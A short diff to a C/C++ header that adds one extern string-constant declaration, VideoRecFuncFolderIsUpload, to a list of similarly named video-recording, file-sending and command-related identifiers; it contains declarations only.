@@ -126,6 +126,7 @@ extern CSSTR VideoRecFuncResetTimer[];
 extern CSSTR VideoRecFuncSendFiles[];
 extern CSSTR VideoRecFuncSendFilesAsync[];
 extern CSSTR VideoRecFuncIsSendedAsync[];
+extern CSSTR VideoRecFuncFolderIsUpload[];
 extern CSSTR VideoRecFuncRunCmdExec[];
 extern CSSTR VideoRecFuncSendLog[];
 extern CSSTR VideoRecPipe[];
